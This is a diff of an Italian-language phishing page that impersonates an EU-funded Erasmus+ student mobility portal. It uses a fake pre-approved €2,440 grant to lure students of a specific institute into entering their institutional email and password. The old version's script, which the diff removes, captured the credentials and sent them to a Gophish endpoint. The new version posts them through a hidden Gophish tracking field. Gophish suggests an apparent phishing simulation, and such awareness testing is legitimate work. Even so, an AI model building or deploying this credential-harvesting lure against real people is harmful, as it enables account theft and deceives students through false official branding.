@@ -4,7 +4,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Autenticazione Portale Studenti - Europe for Youth</title>
+    <title>Portale Studenti - Europe for Youth | Erasmus+ Mobility Programme</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
         * {
             margin: 0;
@@ -13,214 +16,222 @@
         }
 
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            height: 100vh;
-            width: 100vw;
-            display: block;
-            padding: 0;
-            position: relative;
-            overflow: hidden;
-            margin: 0;
-        }
-
-        /* Animated background particles */
-        body::before {
-            content: '';
-            position: absolute;
-            width: 200%;
-            height: 200%;
-            background-image:
-                radial-gradient(circle at 20% 50%, rgba(255, 255, 255, 0.1) 0%, transparent 50%),
-                radial-gradient(circle at 80% 80%, rgba(255, 255, 255, 0.1) 0%, transparent 50%),
-                radial-gradient(circle at 40% 20%, rgba(255, 255, 255, 0.08) 0%, transparent 50%);
-            animation: float 20s ease-in-out infinite;
-        }
-
-        @keyframes float {
-
-            0%,
-            100% {
-                transform: translate(0, 0);
-            }
-
-            33% {
-                transform: translate(30px, -30px);
-            }
-
-            66% {
-                transform: translate(-20px, 20px);
-            }
-        }
-
-        .container {
-            background: #ffffff;
-            border-radius: 0;
-            box-shadow: none;
-            max-width: 100%;
-            width: 100%;
-            height: 100vh;
-            overflow-y: auto;
-            position: relative;
-            z-index: 1;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #f5f7fa;
+            min-height: 100vh;
             display: flex;
             flex-direction: column;
+            color: #2c3e50;
+            line-height: 1.6;
         }
 
-        @keyframes slideUp {
-            from {
-                opacity: 0;
-                transform: translateY(40px);
-            }
-
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
+        /* EU Official Header */
+        .eu-header {
+            background: #003399;
+            padding: 12px 0;
+            border-bottom: 3px solid #ffcc00;
         }
 
-        .header {
-            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
-            padding: 45px 40px;
-            text-align: center;
-            color: #ffffff;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .header::after {
-            content: '';
-            position: absolute;
-            top: -50%;
-            right: -50%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle, rgba(255, 255, 255, 0.1) 0%, transparent 70%);
-            animation: pulse 4s ease-in-out infinite;
-        }
-
-        @keyframes pulse {
-
-            0%,
-            100% {
-                transform: scale(1);
-                opacity: 0.5;
-            }
-
-            50% {
-                transform: scale(1.1);
-                opacity: 0.8;
-            }
-        }
-
-        .header h1 {
-            font-size: 30px;
-            font-weight: 700;
-            margin-bottom: 8px;
-            letter-spacing: -0.5px;
-            position: relative;
-            z-index: 1;
-        }
-
-        .header p {
-            font-size: 14px;
-            color: rgba(255, 255, 255, 0.85);
-            font-weight: 500;
-            letter-spacing: 1.2px;
-            text-transform: uppercase;
-            position: relative;
-            z-index: 1;
-        }
-
-        .content {
-            padding: 45px 40px;
-            max-width: 800px;
+        .eu-header-content {
+            max-width: 1200px;
             margin: 0 auto;
+            padding: 0 24px;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .eu-flag {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            color: #ffffff;
+            font-size: 13px;
+            font-weight: 500;
+        }
+
+        .eu-stars {
+            width: 48px;
+            height: 32px;
+            background: #003399;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .eu-stars::before {
+            content: '★★★★★★★★★★★★';
+            color: #ffcc00;
+            font-size: 8px;
+            letter-spacing: -1px;
+        }
+
+        /* Main Navigation */
+        .main-nav {
+            background: #ffffff;
+            border-bottom: 1px solid #e1e8ed;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.04);
+        }
+
+        .nav-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px 24px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo-section {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .logo-text {
+            font-size: 22px;
+            font-weight: 700;
+            color: #003399;
+            letter-spacing: -0.3px;
+        }
+
+        .logo-subtitle {
+            font-size: 12px;
+            color: #64748b;
+            font-weight: 500;
+            margin-top: 2px;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 28px;
+            align-items: center;
+        }
+
+        .nav-links a {
+            color: #475569;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            transition: color 0.2s;
+        }
+
+        .nav-links a:hover {
+            color: #003399;
+        }
+
+        /* Main Container */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 48px 24px;
             flex: 1;
         }
 
-        .status-badge {
-            display: inline-block;
-            background: linear-gradient(135deg, #48bb78 0%, #38a169 100%);
-            color: #ffffff;
-            padding: 10px 20px;
-            border-radius: 50px;
+        /* Breadcrumb */
+        .breadcrumb {
             font-size: 13px;
-            font-weight: 700;
-            letter-spacing: 0.5px;
-            text-transform: uppercase;
-            margin-bottom: 24px;
-            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
-        }
-
-        .welcome-text {
+            color: #64748b;
             margin-bottom: 32px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
         }
 
-        .welcome-text h2 {
-            color: #1a202c;
-            font-size: 24px;
-            margin-bottom: 12px;
-            font-weight: 700;
-            line-height: 1.3;
+        .breadcrumb a {
+            color: #003399;
+            text-decoration: none;
         }
 
-        .welcome-text p {
-            color: #718096;
-            font-size: 15px;
-            line-height: 1.6;
+        .breadcrumb a:hover {
+            text-decoration: underline;
         }
 
-        .info-card {
-            background: linear-gradient(135deg, #f7fafc 0%, #edf2f7 100%);
-            border-left: 4px solid #667eea;
-            padding: 20px;
-            margin-bottom: 28px;
-            border-radius: 8px;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.04);
+        .breadcrumb span {
+            color: #cbd5e1;
         }
 
-        .info-card h3 {
-            color: #2d3748;
-            font-size: 15px;
-            font-weight: 700;
-            margin-bottom: 10px;
-        }
-
-        .info-card p {
-            color: #4a5568;
-            font-size: 14px;
-            line-height: 1.6;
-            margin: 0;
-        }
-
-        .info-grid {
+        /* Main Content Grid */
+        .content-grid {
             display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 12px;
-            margin-top: 12px;
+            grid-template-columns: 1fr 400px;
+            gap: 32px;
+            align-items: start;
         }
 
-        .info-item {
+        /* Left Column - Form */
+        .form-section {
             background: #ffffff;
-            padding: 12px;
-            border-radius: 6px;
-            border: 1px solid #e2e8f0;
+            border-radius: 8px;
+            border: 1px solid #e1e8ed;
+            overflow: hidden;
         }
 
-        .info-item-label {
-            font-size: 11px;
-            color: #a0aec0;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            margin-bottom: 4px;
+        .form-header {
+            background: linear-gradient(135deg, #003399 0%, #0047bb 100%);
+            padding: 32px;
+            color: #ffffff;
         }
 
-        .info-item-value {
-            font-size: 14px;
-            color: #2d3748;
+        .form-header h1 {
+            font-size: 26px;
             font-weight: 700;
+            margin-bottom: 8px;
+            letter-spacing: -0.4px;
+        }
+
+        .form-header p {
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.9);
+            font-weight: 400;
+        }
+
+        .form-body {
+            padding: 36px 32px;
+        }
+
+        .status-indicator {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: #ecfdf5;
+            border: 1px solid #a7f3d0;
+            color: #065f46;
+            padding: 10px 16px;
+            border-radius: 6px;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 28px;
+        }
+
+        .status-indicator::before {
+            content: '✓';
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 18px;
+            height: 18px;
+            background: #10b981;
+            color: #ffffff;
+            border-radius: 50%;
+            font-size: 11px;
+            font-weight: 700;
+        }
+
+        .section-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: #1e293b;
+            margin-bottom: 16px;
+            letter-spacing: -0.2px;
+        }
+
+        .section-description {
+            color: #64748b;
+            font-size: 14px;
+            line-height: 1.7;
+            margin-bottom: 28px;
         }
 
         .form-group {
@@ -229,402 +240,455 @@
 
         .form-group label {
             display: block;
-            color: #2d3748;
+            color: #334155;
             font-size: 14px;
-            font-weight: 700;
-            margin-bottom: 10px;
-            letter-spacing: 0.3px;
+            font-weight: 600;
+            margin-bottom: 8px;
         }
 
         .form-group input {
             width: 100%;
-            padding: 16px 18px;
-            border: 2px solid #e2e8f0;
-            border-radius: 10px;
+            padding: 12px 14px;
+            border: 1.5px solid #cbd5e1;
+            border-radius: 6px;
             font-size: 15px;
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
             font-family: inherit;
             background: #ffffff;
-            cursor: text;
-            color: #2d3748;
-            caret-color: #2d3748;
+            color: #1e293b;
+            transition: all 0.2s;
         }
 
         .form-group input:focus {
             outline: none;
-            border-color: #667eea;
-            box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.1);
-            transform: translateY(-2px);
+            border-color: #003399;
+            box-shadow: 0 0 0 3px rgba(0, 51, 153, 0.1);
         }
 
         .form-group input::placeholder {
-            color: #cbd5e0;
+            color: #94a3b8;
         }
 
-        .security-notice {
-            background: linear-gradient(135deg, #e6f2ff 0%, #cce5ff 100%);
-            border: 1px solid #4a90e2;
+        .form-help {
+            font-size: 12px;
+            color: #64748b;
+            margin-top: 6px;
+        }
+
+        .info-box {
+            background: #f8fafc;
+            border: 1px solid #e2e8f0;
+            border-left: 3px solid #003399;
             padding: 16px;
-            border-radius: 8px;
-            margin-bottom: 28px;
+            border-radius: 6px;
+            margin-bottom: 24px;
+        }
+
+        .info-box-title {
             font-size: 13px;
-            color: #1a4d7a;
-            line-height: 1.6;
+            font-weight: 600;
+            color: #1e293b;
+            margin-bottom: 8px;
+        }
+
+        .info-box ul {
+            margin: 0;
+            padding-left: 20px;
+            font-size: 13px;
+            color: #475569;
+            line-height: 1.8;
         }
 
         .submit-btn {
             width: 100%;
-            background: linear-gradient(135deg, #2a5298 0%, #1e3c72 100%);
+            background: #003399;
             color: #ffffff;
             border: none;
-            padding: 18px;
-            border-radius: 10px;
-            font-size: 16px;
-            font-weight: 700;
+            padding: 14px 24px;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: 600;
             cursor: pointer;
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-            box-shadow: 0 8px 20px rgba(30, 60, 114, 0.3);
-            letter-spacing: 0.5px;
-            text-transform: uppercase;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .submit-btn::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
-            transition: left 0.5s;
-        }
-
-        .submit-btn:hover::before {
-            left: 100%;
+            transition: all 0.2s;
+            font-family: inherit;
         }
 
         .submit-btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 12px 28px rgba(30, 60, 114, 0.4);
+            background: #002266;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(0, 51, 153, 0.2);
         }
 
         .submit-btn:active {
-            transform: translateY(-1px);
+            transform: translateY(0);
         }
 
-        .footer {
-            background: linear-gradient(180deg, #f7fafc 0%, #edf2f7 100%);
-            padding: 28px 40px;
-            text-align: center;
-            border-top: 1px solid #e2e8f0;
+        /* Right Column - Info Sidebar */
+        .info-sidebar {
+            position: sticky;
+            top: 24px;
         }
 
-        .footer p {
-            color: #718096;
-            font-size: 12px;
+        .info-card {
+            background: #ffffff;
+            border: 1px solid #e1e8ed;
+            border-radius: 8px;
+            padding: 24px;
+            margin-bottom: 20px;
+        }
+
+        .info-card-header {
+            font-size: 15px;
+            font-weight: 700;
+            color: #1e293b;
+            margin-bottom: 16px;
+            padding-bottom: 12px;
+            border-bottom: 2px solid #f1f5f9;
+        }
+
+        .mobility-detail {
+            margin-bottom: 20px;
+        }
+
+        .mobility-detail:last-child {
+            margin-bottom: 0;
+        }
+
+        .detail-label {
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            color: #94a3b8;
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+
+        .detail-value {
+            font-size: 15px;
+            color: #1e293b;
+            font-weight: 600;
+        }
+
+        .detail-value.highlight {
+            color: #003399;
+            font-size: 20px;
+            font-weight: 700;
+        }
+
+        .detail-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+            margin-top: 16px;
+        }
+
+        .help-card {
+            background: #fefce8;
+            border: 1px solid #fde047;
+            border-radius: 8px;
+            padding: 20px;
+        }
+
+        .help-card-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: #713f12;
+            margin-bottom: 8px;
+        }
+
+        .help-card p {
+            font-size: 13px;
+            color: #854d0e;
             line-height: 1.6;
-            margin: 0;
+            margin-bottom: 12px;
         }
 
-        .footer-links {
-            margin-top: 12px;
-        }
-
-        .footer-links a {
-            color: #667eea;
+        .help-card a {
+            color: #003399;
             text-decoration: none;
             font-weight: 600;
-            margin: 0 8px;
-            font-size: 12px;
+            font-size: 13px;
         }
 
-        .footer-links a:hover {
+        .help-card a:hover {
             text-decoration: underline;
         }
 
-        .timer {
-            display: inline-block;
-            background: linear-gradient(135deg, #fc8181 0%, #f56565 100%);
+        /* Footer */
+        .footer {
+            background: #1e293b;
+            color: #cbd5e1;
+            padding: 40px 24px 24px;
+            margin-top: auto;
+        }
+
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 40px;
+            margin-bottom: 32px;
+        }
+
+        .footer-section h3 {
             color: #ffffff;
-            padding: 8px 16px;
-            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 16px;
+        }
+
+        .footer-section ul {
+            list-style: none;
+        }
+
+        .footer-section ul li {
+            margin-bottom: 10px;
+        }
+
+        .footer-section a {
+            color: #cbd5e1;
+            text-decoration: none;
             font-size: 13px;
-            font-weight: 700;
-            margin-top: 8px;
-            box-shadow: 0 4px 12px rgba(245, 101, 101, 0.3);
+            transition: color 0.2s;
         }
 
-        /* Responsive Design */
-        @media screen and (max-width: 768px) {
-            body {
-                padding: 10px;
-                height: 100vh;
-            }
-
-            .container {
-                border-radius: 16px;
-                max-height: 98vh;
-            }
-
-            .header {
-                padding: 35px 30px;
-            }
-
-            .header h1 {
-                font-size: 24px;
-            }
-
-            .header p {
-                font-size: 12px;
-            }
-
-            .content {
-                padding: 35px 30px;
-            }
-
-            .welcome-text h2 {
-                font-size: 20px;
-            }
-
-            .welcome-text p {
-                font-size: 14px;
-            }
-
-            .info-card {
-                padding: 16px;
-            }
-
-            .info-grid {
-                gap: 10px;
-            }
-
-            .info-item {
-                padding: 10px;
-            }
-
-            .security-notice {
-                padding: 14px;
-                font-size: 12px;
-            }
-
-            .timer {
-                font-size: 12px;
-                padding: 6px 12px;
-            }
-
-            .submit-btn {
-                padding: 16px;
-                font-size: 14px;
-            }
-
-            .footer {
-                padding: 24px 30px;
-            }
+        .footer-section a:hover {
+            color: #ffffff;
         }
 
-        @media screen and (max-width: 480px) {
-            body {
-                padding: 5px;
-                height: 100vh;
-            }
+        .footer-bottom {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding-top: 24px;
+            border-top: 1px solid #334155;
+            font-size: 12px;
+            color: #94a3b8;
+            text-align: center;
+        }
 
-            .container {
-                border-radius: 12px;
-                max-height: 99vh;
-            }
-
-            .header {
-                padding: 30px 20px;
-            }
-
-            .header h1 {
-                font-size: 20px;
-            }
-
-            .header p {
-                font-size: 10px;
-                letter-spacing: 1px;
-            }
-
-            .content {
-                padding: 30px 20px;
-            }
-
-            .status-badge {
-                font-size: 11px;
-                padding: 8px 16px;
-            }
-
-            .welcome-text h2 {
-                font-size: 18px;
-            }
-
-            .welcome-text p {
-                font-size: 13px;
-            }
-
-            .info-card h3 {
-                font-size: 14px;
-            }
-
-            .info-card p {
-                font-size: 13px;
-            }
-
-            .info-grid {
+        /* Responsive */
+        @media (max-width: 968px) {
+            .content-grid {
                 grid-template-columns: 1fr;
-                gap: 8px;
             }
 
-            .form-group input {
-                padding: 14px 16px;
-                font-size: 14px;
+            .info-sidebar {
+                position: static;
             }
 
-            .submit-btn {
-                padding: 14px;
-                font-size: 13px;
+            .nav-links {
+                display: none;
             }
 
-            .footer {
-                padding: 20px;
+            .footer-content {
+                grid-template-columns: 1fr;
+                gap: 24px;
+            }
+        }
+
+        @media (max-width: 640px) {
+            .container {
+                padding: 24px 16px;
             }
 
-            .footer p {
-                font-size: 11px;
+            .form-header {
+                padding: 24px 20px;
             }
 
-            .footer-links a {
-                font-size: 11px;
-                margin: 0 6px;
+            .form-header h1 {
+                font-size: 22px;
+            }
+
+            .form-body {
+                padding: 24px 20px;
+            }
+
+            .detail-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .eu-header-content {
+                padding: 0 16px;
+            }
+
+            .nav-content {
+                padding: 16px;
             }
         }
     </style>
 </head>
 
 <body>
-    <div class="container">
-        <div class="header">
-            <h1>EUROPE FOR YOUTH</h1>
-            <p>Portale Autenticazione Studenti</p>
-        </div>
-
-        <div class="content">
-            <div style="text-align: center;">
-                <span class="status-badge">Pre-Approvato</span>
-            </div>
-
-            <div class="welcome-text">
-                <h2>Conferma la Tua Mobilità Erasmus+</h2>
-                <p>Autenticati con le tue credenziali istituzionali per accedere al tuo pacchetto di mobilità
-                    personalizzato e completare il processo di conferma.</p>
-            </div>
-
-            <div class="info-card">
-                <h3>La Tua Assegnazione di Mobilità</h3>
-                <p>Algarve, Portogallo - 8-22 Giugno 2026</p>
-                <div class="info-grid">
-                    <div class="info-item">
-                        <div class="info-item-label">Valore Totale</div>
-                        <div class="info-item-value">€2.440,00</div>
-                    </div>
-                    <div class="info-item">
-                        <div class="info-item-label">Durata Programma</div>
-                        <div class="info-item-value">14 Giorni</div>
-                    </div>
-                    <div class="info-item">
-                        <div class="info-item-label">Alloggio</div>
-                        <div class="info-item-value">A Tuo Carico</div>
-                    </div>
-                    <div class="info-item">
-                        <div class="info-item-label">Trasferimento Borsa</div>
-                        <div class="info-item-value">5 Giorni</div>
-                    </div>
-                </div>
-            </div>
-
-            <div class="security-notice">
-                <strong>ℹ️ Informazioni Importanti</strong><br>
-                Dopo la conferma, riceverai via email:
-                <ul style="margin: 8px 0 0 20px; padding: 0;">
-                    <li>Dettagli per la prenotazione del volo</li>
-                    <li>Istruzioni per il trasferimento della borsa</li>
-                    <li>Documentazione necessaria per la mobilità</li>
-                </ul>
-            </div>
-
-            <form method="POST" id="loginForm">
-                <div class="form-group">
-                    <label for="email">Indirizzo Email Istituzionale</label>
-                    <input type="email" id="email" name="email" placeholder="nome.cognome@itsrizzoli.it" required
-                        autocomplete="email">
-                </div>
-
-                <div class="form-group">
-                    <label for="password">Password</label>
-                    <input type="password" id="password" name="password"
-                        placeholder="Inserisci la tua password istituzionale" required autocomplete="current-password">
-                </div>
-
-                <button type="submit" class="submit-btn">
-                    Autentica e Conferma Partecipazione
-                </button>
-            </form>
-        </div>
-
-        <div class="footer">
-            <p>
-                <strong>Europe for Youth</strong> - Programma Mobilità Erasmus+<br>
-                Autenticazione sicura tramite integrazione SSO istituzionale
-            </p>
-            <div class="footer-links">
-                <a href="#">Privacy Policy</a>
-                <a href="#">Termini di Servizio</a>
-                <a href="#">Supporto</a>
+    <!-- EU Official Header -->
+    <div class="eu-header">
+        <div class="eu-header-content">
+            <div class="eu-flag">
+                <div class="eu-stars"></div>
+                <span>Co-finanziato dall'Unione Europea</span>
             </div>
         </div>
     </div>
 
-    <script>
-        // Gophish credential capture script
-        document.getElementById('loginForm').addEventListener('submit', function (e) {
-            e.preventDefault();
+    <!-- Main Navigation -->
+    <nav class="main-nav">
+        <div class="nav-content">
+            <div class="logo-section">
+                <div>
+                    <div class="logo-text">Europe for Youth</div>
+                    <div class="logo-subtitle">Erasmus+ Student Mobility Portal</div>
+                </div>
+            </div>
 
-            // Get form data
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
+        </div>
+    </nav>
 
-            // Get the rid parameter from URL (Gophish tracking ID)
-            const urlParams = new URLSearchParams(window.location.search);
-            const rid = urlParams.get('rid');
+    <!-- Main Container -->
+    <div class="container">
+        <!-- Content Grid -->
+        <div class="content-grid">
+            <!-- Left Column - Form Section -->
+            <div class="form-section">
+                <div class="form-header">
+                    <h1>Autenticazione Richiesta</h1>
+                    <p>Accedi con le tue credenziali istituzionali per procedere</p>
+                </div>
 
-            if (rid) {
-                // Send credentials to Gophish
-                const formData = new FormData();
-                formData.append('email', email);
-                formData.append('password', password);
-                formData.append('rid', rid);
+                <div class="form-body">
+                    <span class="status-indicator">Candidatura Pre-Approvata</span>
 
-                // Submit to Gophish endpoint
-                fetch(window.location.origin + window.location.pathname + '?' + urlParams.toString(), {
-                    method: 'POST',
-                    body: formData,
-                    mode: 'no-cors' // Important for cross-origin requests
-                }).then(() => {
-                    // Redirect to phished page after submission
-                    window.location.href = 'phished.html';
-                }).catch(() => {
-                    // Even if fetch fails, redirect anyway
-                    window.location.href = 'phished.html';
-                });
-            } else {
-                // No rid parameter, just redirect (for testing without Gophish)
-                window.location.href = 'phished.html';
-            }
-        });
-    </script>
+                    <h2 class="section-title">Conferma la Tua Partecipazione</h2>
+                    <p class="section-description">
+                        Per finalizzare la tua assegnazione di mobilità Erasmus+ e accedere ai dettagli del programma,
+                        è necessario autenticarsi utilizzando le credenziali del portale studenti del tuo istituto.
+                    </p>
+
+                    <div class="info-box">
+                        <div class="info-box-title">Cosa succede dopo l'autenticazione</div>
+                        <ul>
+                            <li>Conferma automatica della tua partecipazione al programma</li>
+                            <li>Accesso immediato ai documenti di viaggio e alloggio</li>
+                            <li>Istruzioni dettagliate per il trasferimento della borsa di studio</li>
+                            <li>Calendario delle attività e informazioni logistiche</li>
+                        </ul>
+                    </div>
+
+                    <form method="POST" action="" id="loginForm">
+                        <!-- Campo nascosto per tracking Gophish -->
+                        <input type="hidden" name="rid" value="{{.RId}}">
+
+                        <div class="form-group">
+                            <label for="email">Email Istituzionale</label>
+                            <input type="email" id="email" name="email" placeholder="nome.cognome@itsrizzoli.it"
+                                pattern="[a-zA-Z0-9._%+-]+@itsrizzoli\.it$" title="Devi usare un'email @itsrizzoli.it"
+                                required autocomplete="email">
+                            <div class="form-help">Utilizza l'indirizzo email fornito dal tuo istituto (@itsrizzoli.it)
+                            </div>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="password">Password</label>
+                            <input type="password" id="password" name="password" placeholder="Inserisci la tua password"
+                                required autocomplete="current-password">
+                            <div class="form-help">La stessa password che usi per accedere al portale studenti</div>
+                        </div>
+
+                        <button type="submit" class="submit-btn">
+                            Accedi e Conferma Partecipazione
+                        </button>
+                    </form>
+                </div>
+            </div>
+
+            <!-- Right Column - Info Sidebar -->
+            <div class="info-sidebar">
+                <div class="info-card">
+                    <div class="info-card-header">Dettagli Mobilità Assegnata</div>
+
+                    <div class="mobility-detail">
+                        <div class="detail-label">Destinazione</div>
+                        <div class="detail-value">Algarve, Portogallo</div>
+                    </div>
+
+                    <div class="mobility-detail">
+                        <div class="detail-label">Periodo</div>
+                        <div class="detail-value">8 - 22 Giugno 2026</div>
+                    </div>
+
+                    <div class="mobility-detail">
+                        <div class="detail-label">Valore Borsa di Studio</div>
+                        <div class="detail-value highlight">€2.440,00</div>
+                    </div>
+
+                    <div class="detail-grid">
+                        <div class="mobility-detail">
+                            <div class="detail-label">Durata</div>
+                            <div class="detail-value">14 giorni</div>
+                        </div>
+                        <div class="mobility-detail">
+                            <div class="detail-label">Erogazione</div>
+                            <div class="detail-value">5 gg lavorativi</div>
+                        </div>
+                    </div>
+
+                    <div class="mobility-detail">
+                        <div class="detail-label">Tipologia</div>
+                        <div class="detail-value">Mobilità per Tirocinio (KA131)</div>
+                    </div>
+
+                    <div class="mobility-detail">
+                        <div class="detail-label">Organizzazione Ospitante</div>
+                        <div class="detail-value">Instituto Politécnico de Faro</div>
+                    </div>
+
+                    <div class="mobility-detail">
+                        <div class="detail-label">Codice Progetto</div>
+                        <div class="detail-value">2026-1-IT02-KA131-HED-000123456</div>
+                    </div>
+                </div>
+
+                <div class="help-card">
+                    <div class="help-card-title">Supporto Tecnico</div>
+                    <p>Per problemi di accesso o assistenza, contatta il Coordinatore Erasmus+ del tuo istituto oppure
+                        scrivi a <strong>mobility@europeforyouth.eu</strong></p>
+                    <p style="font-size: 12px; color: #854d0e; margin-top: 8px;">Orari: Lun-Ven 9:00-17:00 (CET)</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="footer-section">
+                <h3>Europe for Youth</h3>
+                <ul>
+                    <li>Programma Mobilità Erasmus+</li>
+                    <li>Email: mobility@europeforyouth.eu</li>
+                </ul>
+            </div>
+            <div class="footer-section">
+                <h3>Informazioni</h3>
+                <ul>
+                    <li>Co-finanziato dall'Unione Europea</li>
+                    <li>Programma Erasmus+ 2021-2027</li>
+                </ul>
+            </div>
+            <div class="footer-section">
+                <h3>Supporto Tecnico</h3>
+                <ul>
+                    <li>Per assistenza contattare</li>
+                    <li>l'ufficio mobilità del proprio istituto</li>
+                </ul>
+            </div>
+        </div>
+        <div class="footer-bottom">
+            © 2026 Europe for Youth - Erasmus+ Programme | Co-funded by the European Union | Azione Chiave 1 (KA131)<br>
+            I tuoi dati personali sono trattati in conformità al Regolamento (UE) 2016/679 (GDPR) |
+            Tutti i diritti riservati
+        </div>
+    </footer>
+
+
 </body>
 
 </html>
